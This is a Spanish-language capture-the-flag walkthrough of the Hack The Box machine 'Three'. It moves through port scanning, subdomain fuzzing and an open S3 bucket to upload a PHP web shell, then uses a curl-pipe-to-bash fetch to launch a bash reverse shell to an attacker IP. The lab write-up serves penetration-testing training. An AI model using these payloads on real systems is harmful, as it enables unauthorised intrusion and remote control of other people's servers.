# Three

🗹 Verificar si el host está activo:

```shell
ping -c 1 10.129.28.79

PING 10.129.28.79 (10.129.28.79) 56(84) bytes of data.
64 bytes from 10.129.28.79: icmp_seq=1 ttl=63 time=1179 ms

--- 10.129.28.79 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1179.219/1179.219/1179.219/0.000 ms
```

> Sistema operativo:  **Linux**

🗹 Identificar puertos abiertos y qué servicios están corriendo:

```shell
sudo nmap -p- -sS --open --min-rate 5000 -n -Pn -vv 10.129.28.79 -oG openPorts

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

🗹 Ejecutar scripts para recopilar información adicional:

```shell
sudo nmap -p 22,80 -sCV 10.129.28.79 -oN targeted

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Toppers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Puerto | Servicio | Versión                                                      |
| ------ | -------- | ------------------------------------------------------------ |
| 22     | ssh      | OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) |
| 80     | http     | Apache httpd 2.4.29 ((Ubuntu))                               |

🗹 Agregar el dominio al archivo `/etc/hosts`:

```shell
10.129.28.79  thetoppers.htb
```

🗹 Enumerar subdominios:

```shell
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u thetoppers.htb -H "Host:FUZZ.thetoppers.htb" --hl 234
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://thetoppers.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000247:   404        0 L      2 W        21 Ch       "s3"                                                                                                                   
```

🗹 Agregar el subdominio al archivo `/etc/hosts`:

```shell
10.129.28.79  thetoppers.htb s3.thetoppers.htb
```

🗹 Verificar el recurso en el subdominio encontrado:

```
http://s3.thetoppers.htb

{"status": "running"}
```

🗹 Instalar la interfaz de línea de comandos de  **AWS**:

```shell
pip install aws-shell
```

🗹 Acceder al bucket mediante la interfaz de línea de comandos `aws`:

```shell
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb

                           PRE images/
2024-03-09 23:37:38          0 .htaccess
2024-03-09 23:37:38      11952 index.php
```

🗹 Crear un archivo `php` para que reciba mediante un parámetro en la URL un comando para que se ejecute en el sistema operativo:

```php
<? system($_GET["cmd"]); ?>
```

🗹 Copiar el archivo al bucket mediante la interfaz de línea de comandos:

```shell
aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb

upload: ./shell.php to s3://thetoppers.htb/shell.php
```

🗹 Verificar si se ejecuta un comando pasado por parámetro en la URL:

```
http://thetoppers.htb/shell.php?cmd=id

id=33(www-data) gid=33(www-data) groups=33(www-data)
```

🗹 Crear una reverse shell:

```shell
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.51/1234 0>&1
```

🗹 Levantar un servidor con `python` en el directorio donde se encuentra la reverse shell:

```shell
python3 -m http.server 8000
```

🗹 Ponerse en escucha por un puerto a elección para recibir la reverse shell:

```shell
nc -lnvp 1234
```

🗹 Transferir la reverse shell con el comando `curl` desde la URL mediante el parámetro que recibe el archivo que se subió anteriormente al bucket:

`http://thetoppers.htb/shell.php?cmd=curl%2010.10.14.51:8000/shell.sh|bash`

🗹 Una vez establecida la conexión con el servidor configurar la terminal y personalizar el entorno de la terminal:

```shell
script /dev/null -c bash

ctrl + z

stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty size
stty rows 44 columns 183
```
## Flag

La flag se encuentra en el directorio `/var/www/flag.txt`.
